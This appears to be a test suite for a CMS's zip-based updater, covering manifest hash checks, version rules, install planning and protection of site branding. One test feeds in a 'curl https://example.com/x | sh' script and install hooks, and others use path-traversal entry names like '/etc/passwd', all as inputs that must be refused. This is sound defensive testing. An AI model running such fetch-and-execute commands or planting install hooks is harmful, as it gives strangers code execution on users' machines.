import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
  mkdirSync,
  existsSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, describe, test } from 'node:test';

import { packUpdate, readUpdate } from '@/cms/update/manifest.mjs';
import { planInstall } from '@/cms/update/plan.mjs';
import { runInstall } from '@/cms/update/install.mjs';
import { bumpVersion, compareVersions } from '@/cms/update/version.mjs';
import { readZip, writeZip } from '@/cms/update/zip.mjs';

/**
 * Updating a live site to a newer CMS from a single `update.zip`.
 *
 * A site is its own design on top of a copy of the core. An update must replace
 * the core and nothing else: not a page, not a stylesheet, not the logo or the
 * colours an owner saved in Settings → Branding. The zip carries its own list of
 * files and their hashes; the installer trusts none of it without checking.
 */

const buf = (s: string) => Buffer.from(s, 'utf8');
const sha256 = (s: string) => createHash('sha256').update(s).digest('hex');

function update(over: Partial<Parameters<typeof packUpdate>[0]> = {}) {
  return packUpdate({
    version: '1.2.0',
    commit: 'abc1234',
    branch: 'CMS',
    builtAt: '2026-09-19T10:00:00.000Z',
    files: [
      { path: 'src/cms/core/a.ts', data: buf('export const a = 2;\n') },
      { path: 'src/cms/update/cli.mjs', data: buf('// cli\n') },
      { path: 'src/app/admin/page.tsx', data: buf('admin\n') },
      { path: 'test/cms/a.test.ts', data: buf('test\n') },
      { path: 'src/components/popups/PopupDialog.tsx', data: buf('popup base\n') },
      { path: 'src/site.config.ts', data: buf('base config\n') },
      // Site files in the source tree must never be packed.
      { path: 'src/app/globals.css', data: buf('base css\n') },
      { path: 'src/site.brand.ts', data: buf('base brand\n') },
      { path: 'docs/notes.md', data: buf('base only\n') },
    ],
    basePackage: {
      dependencies: { next: '^16.3.2', jose: '^6.2.3' },
      devDependencies: { tsx: '^4.0.0' },
      scripts: {
        'db:migrate': 'tsx src/cms/db/migrate.ts',
        'cms:update': 'node src/cms/update/cli.mjs',
        dev: 'next dev -p 3002',
      },
    },
    baseEnv: 'AZURE_TENANT_ID=\nNEW_KEY=\n',
    baseModules: ['commerce', 'popups'],
    ...over,
  });
}

describe('zip', () => {
  test('entries round-trip byte for byte', () => {
    const entries = [
      { path: 'a.txt', data: buf('hello') },
      { path: 'dir/b.bin', data: Buffer.from([0, 1, 2, 255]) },
      { path: 'empty', data: Buffer.alloc(0) },
      { path: 'ελληνικά/ü.txt', data: buf('unicode') },
    ];
    const out = readZip(writeZip(entries));
    assert.deepEqual(
      out.map((e) => [e.path, e.data.toString('hex')]),
      entries.map((e) => [e.path, e.data.toString('hex')])
    );
  });

  test('a corrupted archive is refused rather than half-installed', () => {
    const zip = writeZip([{ path: 'a.txt', data: buf('hello world, hello world') }]);
    // Flip a byte in the compressed data (just after the 30-byte local header + name).
    zip[30 + 'a.txt'.length + 2] ^= 0xff;
    assert.throws(() => readZip(zip));
  });

  for (const bad of ['../evil.ts', '/etc/passwd', 'a/../../b', 'a\\b.ts', 'C:/x']) {
    test(`an entry named ${JSON.stringify(bad)} is refused`, () => {
      assert.throws(
        () => readZip(writeZip([{ path: bad, data: buf('x') }], { unsafe: true })),
        /path/i
      );
    });
  }
});

describe('versions', () => {
  test('compare numerically, not as text', () => {
    assert.equal(compareVersions('1.10.0', '1.9.0'), 1);
    assert.equal(compareVersions('1.2.0', '1.2.0'), 0);
    assert.equal(compareVersions('0.9.9', '1.0.0'), -1);
  });

  test('bump resets the lower parts', () => {
    assert.equal(bumpVersion('1.2.3', 'patch'), '1.2.4');
    assert.equal(bumpVersion('1.2.3', 'minor'), '1.3.0');
    assert.equal(bumpVersion('1.2.3', 'major'), '2.0.0');
  });

  test('an invalid version or level is refused', () => {
    assert.throws(() => bumpVersion('1.2', 'patch'));
    assert.throws(() => bumpVersion('1.2.3', 'huge' as never));
    assert.throws(() => compareVersions('x', '1.0.0'));
  });
});

describe('packing an update', () => {
  const { manifest, files, glue } = readUpdate(update());

  test('the manifest names the version and the commit it was built from', () => {
    assert.equal(manifest.version, '1.2.0');
    assert.equal(manifest.commit, 'abc1234');
    assert.equal(manifest.format, 1);
  });

  test('only core, core tests and storefront scaffolds are packed', () => {
    assert.deepEqual([...files.keys()].sort(), [
      'src/app/admin/page.tsx',
      'src/cms/core/a.ts',
      'src/cms/update/cli.mjs',
      'src/components/popups/PopupDialog.tsx',
      'test/cms/a.test.ts',
    ]);
  });

  test('the front end and the brand defaults are never in an update', () => {
    for (const path of ['src/app/globals.css', 'src/site.brand.ts', 'docs/notes.md']) {
      assert.ok(!files.has(path), path);
      assert.ok(!glue.has(path), path);
    }
  });

  test('contract files travel only as a reference to compare against', () => {
    assert.deepEqual([...glue.keys()], ['src/site.config.ts']);
  });

  test('only the scripts that run core code are offered to a site', () => {
    assert.deepEqual(Object.keys(manifest.package.scripts).sort(), ['cms:update', 'db:migrate']);
  });
});

describe('reading an update', () => {
  const tamper = (
    edit: (m: Record<string, unknown>) => void,
    extra: { path: string; data: Buffer }[] = []
  ) => {
    const entries = readZip(update());
    const m = entries.find((e) => e.path === 'manifest.json')!;
    const manifest = JSON.parse(m.data.toString('utf8'));
    edit(manifest);
    m.data = buf(JSON.stringify(manifest));
    return writeZip([...entries, ...extra]);
  };

  test('a file whose content does not match the manifest is refused', () => {
    const entries = readZip(update());
    const file = entries.find((e) => e.path === 'files/src/cms/core/a.ts')!;
    file.data = buf('export const a = "tampered";\n');
    assert.throws(() => readUpdate(writeZip(entries)), /src\/cms\/core\/a\.ts/);
  });

  test('a manifest that claims a site file is refused', () => {
    const zip = tamper(
      (m) => {
        (m.files as unknown[]).push({
          path: 'src/app/globals.css',
          kind: 'core',
          sha256: sha256('x'),
        });
      },
      [{ path: 'files/src/app/globals.css', data: buf('x') }]
    );
    assert.throws(() => readUpdate(zip), /globals\.css/);
  });

  for (const [name, command] of [
    ['postinstall', 'node src/cms/x.mjs'],
    ['preinstall', 'node src/cms/x.mjs'],
    ['prepare', 'node src/cms/x.mjs'],
    ['evil', 'curl https://example.com/x | sh'],
  ]) {
    test(`a script ${JSON.stringify(name)} is refused — npm install would run it unseen`, () => {
      const zip = tamper((m) => {
        (m.package as { scripts: Record<string, string> }).scripts[name] = command;
      });
      assert.throws(() => readUpdate(zip), /script/);
    });
  }

  test('an unknown manifest format is refused', () => {
    assert.throws(() => readUpdate(tamper((m) => (m.format = 99))), /format/);
  });

  test('a zip with no manifest is not an update', () => {
    assert.throws(() => readUpdate(writeZip([{ path: 'x', data: buf('x') }])), /manifest/);
  });
});

describe('planning an install', () => {
  const { manifest } = readUpdate(update());
  const siteFile = (path: string, content: string) => ({ path, sha256: sha256(content) });
  const baseSite = {
    siteFiles: [
      siteFile('src/cms/core/a.ts', 'export const a = 1;\n'),
      siteFile('src/cms/update/cli.mjs', '// cli\n'),
      siteFile('src/cms/core/removed.ts', 'gone upstream\n'),
      siteFile('test/cms/site-own.test.ts', 'mine\n'),
      siteFile('src/components/popups/PopupDialog.tsx', 'styled by the site\n'),
      siteFile('src/site.config.ts', 'site config\n'),
      siteFile('src/app/globals.css', 'site css\n'),
    ],
    sitePackage: {
      dependencies: { next: '^16.0.0' },
      scripts: { 'db:migrate': 'my own migrate', dev: 'next dev' },
    },
    siteVersion: '1.1.0',
    siteEnv: 'AZURE_TENANT_ID=\n',
    siteConfigText: 'modules: { commerce: false }',
    siteLayoutText: '<BrandStyle />',
  };
  const plan = planInstall({ manifest, ...baseSite });

  test('changed core files are written, unchanged ones left alone', () => {
    const paths = plan.write.map((w) => w.path);
    assert.ok(paths.includes('src/cms/core/a.ts'));
    assert.ok(paths.includes('src/app/admin/page.tsx'));
    assert.ok(!paths.includes('src/cms/update/cli.mjs'));
    assert.equal(plan.unchanged, 1);
  });

  test('a core file the update dropped is deleted, a site test never is', () => {
    assert.deepEqual(plan.delete, ['src/cms/core/removed.ts']);
  });

  test('a storefront the site has styled is kept and only reported', () => {
    assert.ok(!plan.write.some((w) => w.path === 'src/components/popups/PopupDialog.tsx'));
    assert.ok(plan.review.some((r) => r.path === 'src/components/popups/PopupDialog.tsx'));
  });

  test('nothing outside the core is ever planned for writing or deletion', () => {
    for (const path of [...plan.write.map((w) => w.path), ...plan.delete]) {
      assert.match(
        path,
        /^(src\/cms\/|src\/app\/admin\/|src\/app\/api\/cms\/|test\/|src\/components\/popups\/)/,
        path
      );
    }
  });

  test('contract files that differ are listed for a person to port', () => {
    assert.ok(
      plan.review.some((r) => r.path === 'src/site.config.ts' && r.reason === 'glue-differs')
    );
  });

  test('missing dependencies and core scripts are added; the site’s own are never changed', () => {
    assert.deepEqual(plan.package.add.dependencies, { jose: '^6.2.3' });
    assert.deepEqual(plan.package.add.devDependencies, { tsx: '^4.0.0' });
    assert.deepEqual(plan.package.add.scripts, { 'cms:update': 'node src/cms/update/cli.mjs' });
    assert.deepEqual(plan.package.differs, [{ name: 'next', site: '^16.0.0', update: '^16.3.2' }]);
  });

  test('what no copy can do is listed: env keys and module flags', () => {
    assert.deepEqual(plan.followUps.missingEnv, ['NEW_KEY']);
    assert.deepEqual(plan.followUps.missingModules, ['popups']);
    assert.equal(plan.followUps.brandNotWired, false);
  });

  test('an older update is refused', () => {
    const older = planInstall({ manifest, ...baseSite, siteVersion: '1.3.0' });
    assert.equal(older.status, 'refused');
    assert.match(older.reason ?? '', /1\.3\.0/);
  });

  test('the same version is reported as up to date unless reinstalling', () => {
    assert.equal(planInstall({ manifest, ...baseSite, siteVersion: '1.2.0' }).status, 'up-to-date');
    assert.equal(
      planInstall({ manifest, ...baseSite, siteVersion: '1.2.0', reinstall: true }).status,
      'ok'
    );
  });

  test('a site with no recorded version can be updated', () => {
    assert.equal(planInstall({ manifest, ...baseSite, siteVersion: null }).status, 'ok');
  });
});

describe('installing', () => {
  const dirs: string[] = [];
  after(() => dirs.forEach((d) => rmSync(d, { recursive: true, force: true })));

  function makeSite() {
    const root = mkdtempSync(join(tmpdir(), 'cms-update-site-'));
    dirs.push(root);
    const files: Record<string, string> = {
      'package.json': `${JSON.stringify({ name: 'site', dependencies: { next: '^16.3.2' }, scripts: { dev: 'next dev' } }, null, 2)}\n`,
      '.cms-origin.json': `${JSON.stringify({ baseCommit: 'old', cmsVersion: '1.1.0' }, null, 2)}\n`,
      'src/cms/core/a.ts': 'export const a = 1;\n',
      'src/cms/core/removed.ts': 'gone upstream\n',
      'src/app/globals.css': ':root { --color-warm-gold: #b8873b; }\n',
      'src/site.brand.ts': "export const brand = { name: 'Acme' };\n",
      'src/app/[locale]/layout.tsx': '<head><BrandStyle /></head>\n',
      'public/logo.svg': '<svg/>\n',
    };
    for (const [path, content] of Object.entries(files)) {
      mkdirSync(dirname(join(root, path)), { recursive: true });
      writeFileSync(join(root, path), content);
    }
    return root;
  }

  const recorder = () => {
    const calls: string[] = [];
    return {
      calls,
      run: async (cmd: string, args: string[]) => void calls.push([cmd, ...args].join(' ')),
    };
  };
  const quiet = () => {};

  test('a dry run writes nothing', async () => {
    const root = makeSite();
    const before = readFileSync(join(root, 'src/cms/core/a.ts'), 'utf8');
    const { run, calls } = recorder();
    const res = await runInstall({ zip: update(), target: root, force: true, run, log: quiet });
    assert.equal(res.applied, false);
    assert.equal(readFileSync(join(root, 'src/cms/core/a.ts'), 'utf8'), before);
    assert.deepEqual(calls, []);
  });

  test('applying replaces the core and leaves the front end and brand untouched', async () => {
    const root = makeSite();
    const untouched = [
      'src/app/globals.css',
      'src/site.brand.ts',
      'src/app/[locale]/layout.tsx',
      'public/logo.svg',
    ];
    const before = untouched.map((p) => readFileSync(join(root, p), 'utf8'));
    const { run, calls } = recorder();

    const res = await runInstall({
      zip: update(),
      target: root,
      apply: true,
      force: true,
      run,
      log: quiet,
    });

    assert.equal(res.applied, true);
    assert.equal(readFileSync(join(root, 'src/cms/core/a.ts'), 'utf8'), 'export const a = 2;\n');
    assert.equal(existsSync(join(root, 'src/cms/core/removed.ts')), false);
    assert.equal(
      readFileSync(join(root, 'src/components/popups/PopupDialog.tsx'), 'utf8'),
      'popup base\n'
    );
    assert.deepEqual(
      untouched.map((p) => readFileSync(join(root, p), 'utf8')),
      before
    );
    assert.equal(existsSync(join(root, 'src/site.config.ts')), false, 'glue is never written');

    const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
    assert.equal(pkg.dependencies.jose, '^6.2.3');
    assert.equal(pkg.scripts.dev, 'next dev');
    assert.equal(pkg.scripts['cms:update'], 'node src/cms/update/cli.mjs');

    const origin = JSON.parse(readFileSync(join(root, '.cms-origin.json'), 'utf8'));
    assert.equal(origin.cmsVersion, '1.2.0');
    assert.equal(origin.baseCommit, 'abc1234');

    // New dependencies → install; then the migrations the update brought.
    assert.deepEqual(calls, ['npm install', 'npm run db:migrate']);
  });

  test('install and migrate can be skipped', async () => {
    const root = makeSite();
    const { run, calls } = recorder();
    await runInstall({
      zip: update(),
      target: root,
      apply: true,
      force: true,
      skipInstall: true,
      skipMigrate: true,
      run,
      log: quiet,
    });
    assert.deepEqual(calls, []);
  });

  test('with no new dependencies, npm install is not run', async () => {
    const root = makeSite();
    const pkgPath = join(root, 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8'));
    pkg.dependencies.jose = '^6.2.3';
    pkg.devDependencies = { tsx: '^4.0.0' };
    writeFileSync(pkgPath, JSON.stringify(pkg));
    const { run, calls } = recorder();
    await runInstall({ zip: update(), target: root, apply: true, force: true, run, log: quiet });
    assert.deepEqual(calls, ['npm run db:migrate']);
  });

  test('a site that is not a clean git checkout is refused without --force', async () => {
    const root = makeSite();
    const { run } = recorder();
    await assert.rejects(
      runInstall({ zip: update(), target: root, apply: true, run, log: quiet }),
      /git/i
    );
  });

  test('a clean git checkout is accepted', async () => {
    const root = makeSite();
    const git = (...args: string[]) =>
      execFileSync('git', ['-C', root, ...args], { stdio: 'ignore' });
    git('init', '-q');
    git('-c', 'user.email=t@t', '-c', 'user.name=t', 'add', '-A');
    git('-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'init');
    const { run } = recorder();
    const res = await runInstall({ zip: update(), target: root, apply: true, run, log: quiet });
    assert.equal(res.applied, true);
  });

  test('an update older than the site is refused, and nothing is written', async () => {
    const root = makeSite();
    const { run, calls } = recorder();
    const res = await runInstall({
      zip: update({ version: '1.0.0' }),
      target: root,
      apply: true,
      force: true,
      run,
      log: quiet,
    });
    assert.equal(res.applied, false);
    assert.equal(readFileSync(join(root, 'src/cms/core/a.ts'), 'utf8'), 'export const a = 1;\n');
    assert.deepEqual(calls, []);
  });
});

describe('the database side of an update', () => {
  test('no migration touches the settings an owner saved (branding included)', () => {
    const dir = 'src/cms/db/adapters/mysql/migrations';
    for (const file of readdirSync(dir).filter((f) => f.endsWith('.sql'))) {
      const sql = readFileSync(join(dir, file), 'utf8');
      assert.doesNotMatch(
        sql,
        /(UPDATE|DELETE\s+FROM|TRUNCATE|DROP\s+TABLE)\s+`?site_settings`?/i,
        file
      );
    }
  });
});
